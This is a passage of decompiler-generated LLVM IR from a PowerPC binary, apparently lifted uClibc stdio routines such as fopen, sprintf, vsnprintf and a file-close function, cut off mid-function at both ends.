  %v3_10007e6c = inttoptr i32 %v2_10007e6c to i32*
  %v4_10007e6c = load i32, i32* %v3_10007e6c, align 4
  store i32 %v4_10007e6c, i32* @r28, align 4
  %v3_10007e70 = icmp eq i32 %v4_10007e6c, 0
  store i1 %v3_10007e70, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007e70, label %dec_label_pc_10007e78, label %dec_label_pc_10007e98

dec_label_pc_10007e78:                            ; preds = %entry
  %v2_10007e80 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10007e80, i32* @r3, align 4
  %v0_10007e8c = call i32 @__pthread_return_void()
  %v0_10007e94 = call i32 @__pthread_return_0()
  %v0_10007e98.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007e98

dec_label_pc_10007e98:                            ; preds = %entry, %dec_label_pc_10007e78
  %v0_10007ea8 = phi i32 [ %tmp, %entry ], [ %v0_10007e98.pre, %dec_label_pc_10007e78 ]
  %v1_10007e98 = inttoptr i32 %v0_10007ea8 to i16*
  %v2_10007e98 = load i16, i16* %v1_10007e98, align 2
  %v3_10007e98 = zext i16 %v2_10007e98 to i32
  store i32 0, i32* @r27, align 4
  %v1_10007ea0 = and i32 %v3_10007e98, 64
  %v3_10007ea0 = icmp eq i32 %v1_10007ea0, 0
  br i1 %v3_10007ea0, label %dec_label_pc_10007eb4, label %dec_label_pc_10007ea8

dec_label_pc_10007ea8:                            ; preds = %dec_label_pc_10007e98
  store i32 268467888, i32* @lr, align 4
  %v4_10007eac = call i32 @fflush_unlocked(i16* %v1_10007e98, i32 %v1_10007ea0)
  store i32 %v4_10007eac, i32* @r27, align 4
  %v0_10007eb4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007eb4

dec_label_pc_10007eb4:                            ; preds = %dec_label_pc_10007e98, %dec_label_pc_10007ea8
  %v0_10007eb4 = phi i32 [ %v0_10007ea8, %dec_label_pc_10007e98 ], [ %v0_10007eb4.pre, %dec_label_pc_10007ea8 ]
  %v1_10007eb4 = add i32 %v0_10007eb4, 4
  %v2_10007eb4 = inttoptr i32 %v1_10007eb4 to i32*
  %v3_10007eb4 = load i32, i32* %v2_10007eb4, align 4
  store i32 268467900, i32* @lr, align 4
  %v1_10007eb8 = call i32 @__libc_close(i32 %v3_10007eb4)
  %v3_10007ebc = icmp eq i32 %v1_10007eb8, 0
  store i1 %v3_10007ebc, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_10007eb8, -1
  br i1 %tmp8, label %dec_label_pc_10007ec8, label %dec_label_pc_10007ec4

dec_label_pc_10007ec4:                            ; preds = %dec_label_pc_10007eb4
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10007ec8

dec_label_pc_10007ec8:                            ; preds = %dec_label_pc_10007eb4, %dec_label_pc_10007ec4
  store i32 ptrtoint ([3 x i8]* @global_var_1000bfac.279 to i32), i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_100231b8.280 to i32), i32* @r29, align 4
  %v1_10007edc = load i32, i32* @r31, align 4
  %v2_10007edc = add i32 %v1_10007edc, 4
  %v3_10007edc = inttoptr i32 %v2_10007edc to i32*
  store i32 -1, i32* %v3_10007edc, align 4
  %v2_10007ee0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10007ee0, i32* @r30, align 4
  store i32 %v2_10007ee0, i32* @r3, align 4
  %v0_10007ef0 = call i32 @__pthread_return_void()
  %v0_10007ef8 = call i32 @__pthread_return_0()
  %v3_10007f00 = load i32, i32* @global_var_10023548.281, align 4
  store i32 %v2_10007ee0, i32* @r3, align 4
  %v1_10007f0c = add i32 %v3_10007f00, 1
  store i32 %v1_10007f0c, i32* @global_var_10023548.281, align 4
  %v0_10007f14 = call i32 @__pthread_return_void()
  %v0_10007f18 = load i32, i32* @r31, align 4
  %v1_10007f18 = inttoptr i32 %v0_10007f18 to i16*
  %v2_10007f18 = load i16, i16* %v1_10007f18, align 2
  %v3_10007f18 = zext i16 %v2_10007f18 to i32
  %v0_10007f1c = load i32, i32* @r28, align 4
  %v3_10007f1c = icmp eq i32 %v0_10007f1c, 0
  store i1 %v3_10007f1c, i1* %cr7_eq.global-to-local, align 1
  %v1_10007f20 = call i32 @__asm_rlwinm(i32 %v3_10007f18, i32 0, i32 17, i32 18)
  %v1_10007f28 = or i32 %v1_10007f20, 48
  %v1_10007f2c = trunc i32 %v1_10007f28 to i16
  %v2_10007f2c = load i32, i32* @r31, align 4
  %v3_10007f2c = inttoptr i32 %v2_10007f2c to i16*
  store i16 %v1_10007f2c, i16* %v3_10007f2c, align 2
  %v0_10007f30 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007f30, label %dec_label_pc_10007f34, label %dec_label_pc_10007f40

dec_label_pc_10007f34:                            ; preds = %dec_label_pc_10007ec8
  %v2_10007f34 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10007f34, i32* @r3, align 4
  %v0_10007f3c = call i32 @__pthread_return_void()
  br label %dec_label_pc_10007f40

dec_label_pc_10007f40:                            ; preds = %dec_label_pc_10007ec8, %dec_label_pc_10007f34
  %v0_10007f40 = load i32, i32* @r31, align 4
  %v1_10007f40 = inttoptr i32 %v0_10007f40 to i16*
  %v2_10007f40 = load i16, i16* %v1_10007f40, align 2
  %v1_10007f44 = and i16 %v2_10007f40, 16384
  %v3_10007f44 = icmp eq i16 %v1_10007f44, 0
  br i1 %v3_10007f44, label %dec_label_pc_10007f54, label %dec_label_pc_10007f4c

dec_label_pc_10007f4c:                            ; preds = %dec_label_pc_10007f40
  %v1_10007f4c = add i32 %v0_10007f40, 8
  %v2_10007f4c = inttoptr i32 %v1_10007f4c to i32*
  %v3_10007f4c = load i32, i32* %v2_10007f4c, align 4
  store i32 %v3_10007f4c, i32* @r3, align 4
  store i32 268468052, i32* @lr, align 4
  %v0_10007f50 = call i32 @free()
  br label %dec_label_pc_10007f54

dec_label_pc_10007f54:                            ; preds = %dec_label_pc_10007f40, %dec_label_pc_10007f4c
  store i32 %v2_10007ee0, i32* @r3, align 4
  %v0_10007f60 = call i32 @__pthread_return_void()
  %v0_10007f68 = call i32 @__pthread_return_0()
  %v3_10007f70 = load i32, i32* @global_var_1002354c.282, align 4
  store i32 %v2_10007ee0, i32* @r3, align 4
  %v1_10007f7c = add i32 %v3_10007f70, 1
  store i32 %v1_10007f7c, i32* @global_var_1002354c.282, align 4
  %v0_10007f84 = call i32 @__pthread_return_void()
  store i32 268468108, i32* @lr, align 4
  %v0_10007f88 = call i32 @_stdio_openlist_dec_use()
  %v0_10007f90 = load i32, i32* @r27, align 4
  ret i32 %v0_10007f90

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10007f54, { 1, 0 }
  uselistorder label %dec_label_pc_10007f40, { 1, 0 }
  uselistorder label %dec_label_pc_10007ec8, { 1, 0 }
  uselistorder label %dec_label_pc_10007eb4, { 1, 0 }
  uselistorder label %dec_label_pc_10007e98, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_10007fac = call i32 @_stdio_fopen(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_10007fac
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  store i32 %arg5, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_10007fd0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10007fd0, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_10008020 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10008020, i32* %stack_var_-96, align 4
  store i32 268468268, i32* @lr, align 4
  %v0_10008028 = call i32 @__GI_vsnprintf()
  ret i32 %v0_10008028
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_10008048 = load i32, i32* @r4, align 4
  store i32 %v0_10008048, i32* @r27, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_10008064 = load i32, i32* @r3, align 4
  %v1_10008064 = sub i32 -1, %v0_10008064
  store i32 %v1_10008064, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_10008064, i32* %r31.global-to-local, align 4
  %v2_10008078 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10008078, i32* @r3, align 4
  %v0_1000807c = load i32, i32* @r5, align 4
  store i32 %v0_1000807c, i32* %r29.global-to-local, align 4
  %v0_10008080 = load i32, i32* @r6, align 4
  store i32 %v0_10008080, i32* @r28, align 4
  store i32 268468368, i32* @lr, align 4
  %v0_1000808c = call i32 @__stdio_init_mutex()
  %v0_10008090 = load i32, i32* %r30.global-to-local, align 4
  %v1_10008090 = load i32, i32* @r27, align 4
  %v3_10008090 = icmp ugt i32 %v0_10008090, %v1_10008090
  %v0_10008094 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10008094, i32* @r4, align 4
  %v0_10008098 = load i32, i32* @r28, align 4
  store i32 %v0_10008098, i32* @r5, align 4
  %v2_1000809c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000809c, i32* @r3, align 4
  br i1 %v3_10008090, label %dec_label_pc_100080a8, label %dec_label_pc_100080ac

dec_label_pc_100080a8:                            ; preds = %entry
  store i32 %v1_10008090, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100080ac

dec_label_pc_100080ac:                            ; preds = %entry, %dec_label_pc_100080a8
  %v1_100080ac = phi i32 [ %v0_10008090, %entry ], [ %v1_10008090, %dec_label_pc_100080a8 ]
  %v0_100080ac = load i32, i32* %r31.global-to-local, align 4
  store i32 268468428, i32* @lr, align 4
  %v0_100080c8 = call i32 @_vfprintf_internal()
  %v0_100080cc = load i32, i32* @r30, align 4
  %v3_100080cc = icmp eq i32 %v0_100080cc, 0
  br i1 %v3_100080cc, label %dec_label_pc_100080f4, label %dec_label_pc_100080d4

dec_label_pc_100080d4:                            ; preds = %dec_label_pc_100080ac
  %v4_100080e0 = icmp eq i32 %v1_100080ac, 0
  %v1_100080dc = sext i1 %v4_100080e0 to i32
  %v0_100080e8.v0_100080ac = add i32 %v0_100080ac, %v1_100080dc
  %stack_var_-88.0 = inttoptr i32 %v0_100080e8.v0_100080ac to i8*
  %v0_100080f0 = load i32, i32* @r26, align 4
  %v1_100080f0 = trunc i32 %v0_100080f0 to i8
  store i8 %v1_100080f0, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_100080f4

dec_label_pc_100080f4:                            ; preds = %dec_label_pc_100080ac, %dec_label_pc_100080d4
  ret i32 %v0_100080c8

; uselistorder directives
  uselistorder i32 %v0_10008064, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder label %dec_label_pc_100080f4, { 1, 0 }
  uselistorder label %dec_label_pc_100080ac, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10008108 = load i32, i32* @lr, align 4
  store i32 %v0_10008108, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_1000811c = load i32, i32* @r5, align 4
  store i32 %v0_1000811c, i32* @r31, align 4
  %v0_10008120 = load i32, i32* @r6, align 4
  store i32 %v0_10008120, i32* @r29, align 4
  %v3_10008124 = load i8, i8* %arg2, align 1
  %v4_10008124 = zext i8 %v3_10008124 to i32
  store i32 %v4_10008124, i32* %r0.global-to-local, align 4
  %v3_10008128 = icmp eq i8 %v3_10008124, 114
  br i1 %v3_10008128, label %dec_label_pc_10008174, label %dec_label_pc_10008130

dec_label_pc_10008130:                            ; preds = %entry
  %v3_10008130 = icmp eq i8 %v3_10008124, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_10008130, label %dec_label_pc_10008178, label %dec_label_pc_1000813c

dec_label_pc_1000813c:                            ; preds = %dec_label_pc_10008130
  %v3_1000813c = icmp eq i8 %v3_10008124, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_1000813c, label %dec_label_pc_10008178, label %dec_label_pc_10008148

dec_label_pc_10008148:                            ; preds = %dec_label_pc_10008208, %dec_label_pc_100081d8, %dec_label_pc_1000813c
  %v0_10008148 = call i32 @__errno_location()
  %v0_1000814c = load i32, i32* @r31, align 4
  %v3_1000814c = icmp eq i32 %v0_1000814c, 0
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10008154 = inttoptr i32 %v0_10008148 to i32*
  store i32 22, i32* %v2_10008154, align 4
  br i1 %v3_1000814c, label %dec_label_pc_100083a8, label %dec_label_pc_1000815c

dec_label_pc_1000815c:                            ; preds = %dec_label_pc_1000823c, %dec_label_pc_10008148
  %v0_1000815c = load i32, i32* @r31, align 4
  %v1_1000815c = inttoptr i32 %v0_1000815c to i16*
  %v2_1000815c = load i16, i16* %v1_1000815c, align 2
  %v3_1000815c = zext i16 %v2_1000815c to i32
  store i32 %v3_1000815c, i32* %r0.global-to-local, align 4
  %v1_10008160 = and i32 %v3_1000815c, 8192
  store i32 %v1_10008160, i32* %r9.global-to-local, align 4
  %v3_10008160 = icmp eq i32 %v1_10008160, 0
  store i1 %v3_10008160, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_10008160, label %dec_label_pc_100083a8, label %dec_label_pc_10008168

dec_label_pc_10008168:                            ; preds = %dec_label_pc_1000815c
  store i32 %v0_1000815c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10008170.284 to i32), i32* @lr, align 4
  %v0_1000816c = call i32 @free()
  br label %dec_label_pc_100083a8

dec_label_pc_10008174:                            ; preds = %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10008178

dec_label_pc_10008178:                            ; preds = %dec_label_pc_1000813c, %dec_label_pc_10008130, %dec_label_pc_10008174
  %v0_10008198 = phi i32 [ 1089, %dec_label_pc_1000813c ], [ 577, %dec_label_pc_10008130 ], [ 1, %dec_label_pc_10008174 ]
  %v2_10008178 = add i32 %tmp, 1
  %v3_10008178 = inttoptr i32 %v2_10008178 to i8*
  %v4_10008178 = load i8, i8* %v3_10008178, align 1
  %v5_10008178 = zext i8 %v4_10008178 to i32
  store i32 %v5_10008178, i32* %r0.global-to-local, align 4
  %v3_10008180 = icmp eq i8 %v4_10008178, 98
  br i1 %v3_10008180, label %dec_label_pc_1000818c, label %dec_label_pc_10008188

dec_label_pc_10008188:                            ; preds = %dec_label_pc_10008178
  br label %dec_label_pc_1000818c

dec_label_pc_1000818c:                            ; preds = %dec_label_pc_10008178, %dec_label_pc_10008188
  %storemerge = phi i32 [ %tmp, %dec_label_pc_10008188 ], [ %v2_10008178, %dec_label_pc_10008178 ]
  %v0_1000818c = phi i32 [ %tmp, %dec_label_pc_10008188 ], [ %v2_10008178, %dec_label_pc_10008178 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1000818c = add i32 %v0_1000818c, 1
  %v2_1000818c = inttoptr i32 %v1_1000818c to i8*
  %v3_1000818c = load i8, i8* %v2_1000818c, align 1
  %v4_1000818c = zext i8 %v3_1000818c to i32
  store i32 %v4_1000818c, i32* %r0.global-to-local, align 4
  %v3_10008190 = icmp eq i8 %v3_1000818c, 43
  br i1 %v3_10008190, label %dec_label_pc_10008198, label %dec_label_pc_100081a0

dec_label_pc_10008198:                            ; preds = %dec_label_pc_1000818c
  store i32 %v0_10008198, i32* %r9.global-to-local, align 4
  %v1_1000819c = add nuw nsw i32 %v0_10008198, 1
  store i32 %v1_1000819c, i32* @r28, align 4
  br label %dec_label_pc_100081a0

dec_label_pc_100081a0:                            ; preds = %dec_label_pc_1000818c, %dec_label_pc_10008198
  %v3_100081a0 = icmp eq i32 %v0_1000811c, 0
  br i1 %v3_100081a0, label %dec_label_pc_100081a8, label %dec_label_pc_100081d0

dec_label_pc_100081a8:                            ; preds = %dec_label_pc_100081a0
  store i32 80, i32* @r3, align 4
  store i32 268468656, i32* @lr, align 4
  %v0_100081ac = call i32 @malloc()
  store i32 %v0_100081ac, i32* @r31, align 4
  %v4_100081b0 = icmp eq i32 %v0_100081ac, 0
  store i1 %v4_100081b0, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_100081b0, label %dec_label_pc_100083ac, label %dec_label_pc_100081b8

dec_label_pc_100081b8:                            ; preds = %dec_label_pc_100081a8
  %v1_100081bc = add i32 %v0_100081ac, 56
  store i32 %v1_100081bc, i32* @r3, align 4
  %v3_100081c0 = inttoptr i32 %v0_100081ac to i16*
  store i16 8192, i16* %v3_100081c0, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100081c8 = load i32, i32* @r31, align 4
  %v2_100081c8 = add i32 %v1_100081c8, 8
  %v3_100081c8 = inttoptr i32 %v2_100081c8 to i32*
  store i32 0, i32* %v3_100081c8, align 4
  store i32 268468688, i32* @lr, align 4
  %v0_100081cc = call i32 @__stdio_init_mutex()
  %v0_100081d0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100081d0

dec_label_pc_100081d0:                            ; preds = %dec_label_pc_100081a0, %dec_label_pc_100081b8
  %v0_10008230 = phi i32 [ %v0_10008120, %dec_label_pc_100081a0 ], [ %v0_100081d0.pre, %dec_label_pc_100081b8 ]
  %v1_100081d0 = icmp slt i32 %v0_10008230, 0
  br i1 %v1_100081d0, label %dec_label_pc_10008230, label %dec_label_pc_100081d8

dec_label_pc_100081d8:                            ; preds = %dec_label_pc_100081d0
  %v1_100081dc = add i32 %arg1, 1
  store i32 %v1_100081dc, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_100081e4 = load i32, i32* @r31, align 4
  %v2_100081e4 = add i32 %v1_100081e4, 4
  %v3_100081e4 = inttoptr i32 %v2_100081e4 to i32*
  store i32 %v0_10008230, i32* %v3_100081e4, align 4
  %v0_100081e8 = load i32, i32* @r28, align 4
  %v1_100081e8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100081e8 = and i32 %v1_100081e8, %v0_100081e8
  %v1_100081ec = add i32 %v2_100081e8, 1
  store i32 %v1_100081ec, i32* %r9.global-to-local, align 4
  %v1_100081f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_100081f0 = and i32 %v1_100081f0, %v1_100081ec
  store i32 %v2_100081f0, i32* %r0.global-to-local, align 4
  %v4_100081f4 = icmp eq i32 %v2_100081f0, %v1_100081ec
  br i1 %v4_100081f4, label %dec_label_pc_100081fc, label %dec_label_pc_10008148

dec_label_pc_100081fc:                            ; preds = %dec_label_pc_100081d8
  %v2_100081fc = sub i32 -1, %arg1
  %v3_100081fc = and i32 %v0_100081e8, %v2_100081fc
  store i32 %v3_100081fc, i32* %r0.global-to-local, align 4
  %v1_10008200 = and i32 %v3_100081fc, 1024
  store i32 %v1_10008200, i32* %r9.global-to-local, align 4
  %v3_10008200 = icmp eq i32 %v1_10008200, 0
  store i1 %v3_10008200, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_10008200, label %dec_label_pc_10008224, label %dec_label_pc_10008208

dec_label_pc_10008208:                            ; preds = %dec_label_pc_100081fc
  %v0_10008208 = load i32, i32* @r29, align 4
  store i32 268468764, i32* @lr, align 4
  %v2_10008218 = call i32 @__libc_fcntl(i32 %v0_10008208, i32 4)
  %v3_1000821c = icmp eq i32 %v2_10008218, 0
  br i1 %v3_1000821c, label %dec_label_pc_10008224, label %dec_label_pc_10008148

dec_label_pc_10008224:                            ; preds = %dec_label_pc_10008208, %dec_label_pc_100081fc
  %v1_10008224 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_10008224, i32* %r0.global-to-local, align 4
  %v0_10008228 = load i32, i32* @r28, align 4
  %v2_10008228 = or i32 %v0_10008228, %v1_10008224
  store i32 %v2_10008228, i32* @r28, align 4
  br label %dec_label_pc_1000825c

dec_label_pc_10008230:                            ; preds = %dec_label_pc_100081d0
  %v3_10008230 = icmp eq i32 %v0_10008230, -1
  %v0_10008240.pre = load i32, i32* @r28, align 4
  br i1 %v3_10008230, label %dec_label_pc_1000823c, label %dec_label_pc_10008238

dec_label_pc_10008238:                            ; preds = %dec_label_pc_10008230
  %v1_10008238 = or i32 %v0_10008240.pre, 65536
  store i32 %v1_10008238, i32* @r28, align 4
  br label %dec_label_pc_1000823c

dec_label_pc_1000823c:                            ; preds = %dec_label_pc_10008230, %dec_label_pc_10008238
  %v0_10008240 = phi i32 [ %v1_10008238, %dec_label_pc_10008238 ], [ %v0_10008240.pre, %dec_label_pc_10008230 ]
  store i32 438, i32* @r5, align 4
  store i32 268468816, i32* @lr, align 4
  %v2_1000824c = call i32 @__libc_open(i32 %arg1, i32 %v0_10008240)
  %v1_10008250 = icmp slt i32 %v2_1000824c, 0
  %v1_10008254 = load i32, i32* @r31, align 4
  %v2_10008254 = add i32 %v1_10008254, 4
  %v3_10008254 = inttoptr i32 %v2_10008254 to i32*
  store i32 %v2_1000824c, i32* %v3_10008254, align 4
  br i1 %v1_10008250, label %dec_label_pc_1000815c, label %dec_label_pc_1000823c.dec_label_pc_1000825c_crit_edge

dec_label_pc_1000823c.dec_label_pc_1000825c_crit_edge: ; preds = %dec_label_pc_1000823c
  %v0_10008260.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000825c

dec_label_pc_1000825c:                            ; preds = %dec_label_pc_1000823c.dec_label_pc_1000825c_crit_edge, %dec_label_pc_10008224
  %v0_10008260 = phi i32 [ %v0_10008260.pre, %dec_label_pc_1000823c.dec_label_pc_1000825c_crit_edge ], [ %v2_10008228, %dec_label_pc_10008224 ]
  %v0_1000825c = load i32, i32* @r31, align 4
  %v1_1000825c = inttoptr i32 %v0_1000825c to i16*
  %v2_1000825c = load i16, i16* %v1_1000825c, align 2
  %v3_1000825c = zext i16 %v2_1000825c to i32
  store i32 %v3_1000825c, i32* %r0.global-to-local, align 4
  %v1_10008260 = urem i32 %v0_10008260, 4
  store i32 %v1_10008260, i32* %r29.global-to-local, align 4
  %v1_10008264 = call i32 @__asm_rlwinm(i32 %v0_10008260, i32 0, i32 21, i32 21)
  %v1_10008268 = add nuw nsw i32 %v1_10008260, 1
  store i32 %v1_10008268, i32* %r29.global-to-local, align 4
  %v1_1000826c = call i32 @__asm_rlwinm(i32 %v3_1000825c, i32 0, i32 18, i32 18)
  store i32 %v1_1000826c, i32* %r0.global-to-local, align 4
  %v1_10008270 = xor i32 %v1_10008268, 3
  store i32 %v1_10008270, i32* %r29.global-to-local, align 4
  %v1_10008274 = urem i32 %v1_1000826c, 65536
  store i32 %v1_10008274, i32* %r9.global-to-local, align 4
  %v0_10008278 = load i32, i32* @r28, align 4
  %v1_10008278 = call i32 @__asm_rlwinm(i32 %v0_10008278, i32 31, i32 16, i32 16)
  %v2_1000827c = or i32 %v1_10008278, %v1_10008264
  store i32 %v2_1000827c, i32* %r0.global-to-local, align 4
  %v0_10008280 = load i32, i32* %r29.global-to-local, align 4
  %v1_10008280 = mul i32 %v0_10008280, 16
  %v0_10008284 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008284 = or i32 %v0_10008284, %v2_1000827c
  store i32 %v2_10008284, i32* %r9.global-to-local, align 4
  %v2_10008288 = or i32 %v2_10008284, %v1_10008280
  store i32 %v2_10008288, i32* @r29, align 4
  %v1_1000828c = trunc i32 %v2_10008288 to i16
  %v2_1000828c = load i32, i32* @r31, align 4
  %v3_1000828c = inttoptr i32 %v2_1000828c to i16*
  store i16 %v1_1000828c, i16* %v3_1000828c, align 2
  %v0_10008290 = call i32 @__errno_location()
  store i32 %v0_10008290, i32* @r28, align 4
  %v0_10008298 = load i32, i32* @r31, align 4
  %v1_10008298 = add i32 %v0_10008298, 4
  %v2_10008298 = inttoptr i32 %v1_10008298 to i32*
  %v3_10008298 = load i32, i32* %v2_10008298, align 4
  %v1_1000829c = inttoptr i32 %v0_10008290 to i32*
  %v2_1000829c = load i32, i32* %v1_1000829c, align 4
  store i32 %v2_1000829c, i32* @r27, align 4
  store i32 268468900, i32* @lr, align 4
  %v1_100082a0 = call i32 @isatty(i32 %v3_10008298)
  %v1_100082a4 = mul i32 %v1_100082a0, 256
  %v0_100082a8 = load i32, i32* @r29, align 4
  %v2_100082a8 = or i32 %v0_100082a8, %v1_100082a4
  store i32 %v2_100082a8, i32* @r29, align 4
  %v1_100082ac = trunc i32 %v2_100082a8 to i16
  %v2_100082ac = load i32, i32* @r31, align 4
  %v3_100082ac = inttoptr i32 %v2_100082ac to i16*
  store i16 %v1_100082ac, i16* %v3_100082ac, align 2
  %v0_100082b0 = load i32, i32* @r27, align 4
  %v1_100082b0 = load i32, i32* @r28, align 4
  %v2_100082b0 = inttoptr i32 %v1_100082b0 to i32*
  store i32 %v0_100082b0, i32* %v2_100082b0, align 4
  %v0_100082b4 = load i32, i32* @r31, align 4
  %v1_100082b4 = add i32 %v0_100082b4, 8
  %v2_100082b4 = inttoptr i32 %v1_100082b4 to i32*
  %v3_100082b4 = load i32, i32* %v2_100082b4, align 4
  store i32 %v3_100082b4, i32* %r0.global-to-local, align 4
  %v3_100082b8 = icmp eq i32 %v3_100082b4, 0
  br i1 %v3_100082b8, label %dec_label_pc_100082c0, label %dec_label_pc_100082f0

dec_label_pc_100082c0:                            ; preds = %dec_label_pc_1000825c
  store i32 4096, i32* @r3, align 4
  store i32 268468936, i32* @lr, align 4
  %v0_100082c4 = call i32 @malloc()
  %v3_100082c8 = icmp eq i32 %v0_100082c4, 0
  %v1_100082cc = load i32, i32* @r31, align 4
  %v2_100082cc = add i32 %v1_100082cc, 8
  %v3_100082cc = inttoptr i32 %v2_100082cc to i32*
  store i32 %v0_100082c4, i32* %v3_100082cc, align 4
  %v1_100082ec = load i32, i32* @r31, align 4
  br i1 %v3_100082c8, label %dec_label_pc_100082ec, label %dec_label_pc_100082d4

dec_label_pc_100082d4:                            ; preds = %dec_label_pc_100082c0
  %v1_100082d4 = inttoptr i32 %v1_100082ec to i16*
  %v2_100082d4 = load i16, i16* %v1_100082d4, align 2
  %v3_100082d4 = zext i16 %v2_100082d4 to i32
  store i32 %v3_100082d4, i32* %r0.global-to-local, align 4
  %v1_100082d8 = add i32 %v0_100082c4, 4096
  store i32 %v1_100082d8, i32* %r9.global-to-local, align 4
  %v2_100082dc = add i32 %v1_100082ec, 12
  %v3_100082dc = inttoptr i32 %v2_100082dc to i32*
  store i32 %v1_100082d8, i32* %v3_100082dc, align 4
  %v0_100082e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100082e0 = or i32 %v0_100082e0, 16384
  store i32 %v1_100082e0, i32* %r0.global-to-local, align 4
  %v1_100082e4 = trunc i32 %v1_100082e0 to i16
  %v2_100082e4 = load i32, i32* @r31, align 4
  %v3_100082e4 = inttoptr i32 %v2_100082e4 to i16*
  store i16 %v1_100082e4, i16* %v3_100082e4, align 2
  br label %dec_label_pc_100082f0

dec_label_pc_100082ec:                            ; preds = %dec_label_pc_100082c0
  %v2_100082ec = add i32 %v1_100082ec, 12
  %v3_100082ec = inttoptr i32 %v2_100082ec to i32*
  store i32 0, i32* %v3_100082ec, align 4
  br label %dec_label_pc_100082f0

dec_label_pc_100082f0:                            ; preds = %dec_label_pc_1000825c, %dec_label_pc_100082d4, %dec_label_pc_100082ec
  %v0_100082f0 = load i32, i32* @r31, align 4
  %v1_100082f0 = inttoptr i32 %v0_100082f0 to i16*
  %v2_100082f0 = load i16, i16* %v1_100082f0, align 2
  %v3_100082f0 = zext i16 %v2_100082f0 to i32
  store i32 %v3_100082f0, i32* %r0.global-to-local, align 4
  %v1_100082f4 = add i32 %v0_100082f0, 8
  %v2_100082f4 = inttoptr i32 %v1_100082f4 to i32*
  %v3_100082f4 = load i32, i32* %v2_100082f4, align 4
  store i32 %v3_100082f4, i32* %r9.global-to-local, align 4
  %v1_100082f8 = and i32 %v3_100082f0, 8192
  %v3_100082f8 = icmp eq i32 %v1_100082f8, 0
  store i1 %v3_100082f8, i1* %cr0_eq.global-to-local, align 1
  %v3_10008300 = add i32 %v0_100082f0, 2
  %v4_10008300 = inttoptr i32 %v3_10008300 to i8*
  store i8 0, i8* %v4_10008300, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10008308 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008308 = load i32, i32* @r31, align 4
  %v2_10008308 = add i32 %v1_10008308, 20
  %v3_10008308 = inttoptr i32 %v2_10008308 to i32*
  store i32 %v0_10008308, i32* %v3_10008308, align 4
  %v0_1000830c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000830c = load i32, i32* @r31, align 4
  %v2_1000830c = add i32 %v1_1000830c, 24
  %v3_1000830c = inttoptr i32 %v2_1000830c to i32*
  store i32 %v0_1000830c, i32* %v3_1000830c, align 4
  %v0_10008310 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008310 = load i32, i32* @r31, align 4
  %v2_10008310 = add i32 %v1_10008310, 28
